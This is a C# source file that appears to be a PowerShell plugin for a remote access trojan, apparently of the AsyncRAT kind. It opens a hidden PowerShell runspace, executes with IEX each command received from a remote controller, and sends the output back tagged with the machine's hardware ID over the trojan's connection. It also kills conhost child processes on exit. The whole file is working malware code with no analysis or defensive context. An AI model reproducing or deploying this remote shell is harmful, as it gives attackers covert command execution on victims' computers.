using MessagePackLib.MessagePack;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Management;
using System;
using System.Security.Cryptography;

namespace Plugin.Handler
{
    public class HandlePowershell
    {
        public static Runspace newrunspace;
        
        public void Connect()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "nps";
            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
            msgpack.ForcePathObject("Output").AsString = "###### Powershell ######\n";
            Connection.Send(msgpack.Encode2Bytes());
        }
        public void Startrunspace()
        {
            newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            var cmd = new System.Management.Automation.PSVariable("c");
            newrunspace.SessionStateProxy.PSVariable.Set(cmd);
            var output = new System.Management.Automation.PSVariable("o");
            newrunspace.SessionStateProxy.PSVariable.Set(output);

        }
        public static string InvokeAutomation(string cmd)
        {
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();
            newrunspace.SessionStateProxy.SetVariable("c", cmd);
            if (cmd == "$a;")
            {
                return "";
            }
            else
            {
                pipeline.Commands.AddScript("$o = IEX $c | Out-String");
            }

            Collection<PSObject> results1 = pipeline.Invoke();
            object results2 = newrunspace.SessionStateProxy.GetVariable("o");
            return results2.ToString();

        }

        public void CommandHandler(string input)
        {
            try
            {
                string output = InvokeAutomation(input);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "nps";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Output").AsString = output;
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch { }
            Connect();
        }

        public void Exit()
        {
            newrunspace.Close();
            Process process = Process.GetCurrentProcess();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + process.Id);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                if ("conhost.exe" == Convert.ToString(mo["Name"]))
                {
                    Process proc = Process.GetProcessById(Convert.ToInt32(mo["ProcessID"]));
                    proc.Kill();
                }
            }
            Connection.Disconnected();
        }
    }
}
